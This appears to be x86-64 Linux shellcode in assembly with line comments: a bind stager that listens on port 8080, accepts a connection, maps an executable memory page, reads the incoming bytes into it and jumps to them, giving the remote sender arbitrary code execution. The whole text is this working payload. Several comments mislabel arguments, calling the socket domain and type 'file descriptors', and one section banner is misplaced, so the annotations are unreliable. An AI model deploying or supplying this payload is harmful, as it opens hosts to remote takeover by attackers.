;:;:;                  ;:;:;
;:;:; Executing SOCKET ;:;:;
;:;:;                  ;:;:;
; moving 0x29 into rax -> sys_socket
push   0x29
pop    rax
cdq    
; moving 0x2 into rdi -> out file descriptor
push   0x2
pop    rdi
; moving 0x1 into rsi -> in file descriptor
push   0x1
pop    rsi
; executing sys_socket
syscall 
; saving 0x2 for later
xchg   rdi,rax
push   rdx
;:;:;                ;:;:;
;:;:; Executing BIND ;:;:;
;:;:;                ;:;:;
; moving the port number (8080) to the stack
mov    DWORD PTR [rsp],0x901f0002
; moving address of port 8080 to rsi
mov    rsi,rsp
; moving 0x10 (16) into rdx -> address length
push   0x10
pop    rdx
; moving 0x31 into rax -> sys_bind
push   0x31
pop    rax
; executing sys_bind
syscall 
pop    rcx
;:;:;                  ;:;:;
;:;:; Executing LISTEN ;:;:;
;:;:;                  ;:;:;
; moving 0x32 (50) into rax -> sys_listen
push   0x32
pop    rax
; executing sys_listen
syscall 
; saving results of listen for later
xchg   rsi,rax
;:;:;                  ;:;:;
;:;:; Executing ACCEPT ;:;:;
;:;:;                  ;:;:;
; moving 0x2b to rax -> sys_accept
push   0x2b
pop    rax
; executing system call -> sys_accept
syscall 
; pushes results of ACCEPT to stack
push   rax
push   rsi
pop    rdi
;:;:;                ;:;:;
;:;:; Executing MMAP ;:;:;
;:;:;                ;:;:;
; moves 0x9 to rax -> sys_mmap
push   0x9
pop    rax
cdq    
; moves 0x1000 into rdx
mov    dh,0x10
; copies 0x1000 into rsi
mov    rsi,rdx
; clears r9
xor    r9,r9
; moves 0x22 into r10
push   0x22
pop    r10
; adds 7 to rdx
mov    dl,0x7
;:;:;                ;:;:;
;:;:; Executing READ ;:;:;
;:;:;                ;:;:
; executes sys_mmap
syscall
; saves results into various registers
xchg   rsi,rax
xchg   rdi,rax
; pops results of ACCEPT into rdi
pop    rdi
; executes SYS_READ
syscall 
jmp    rsi
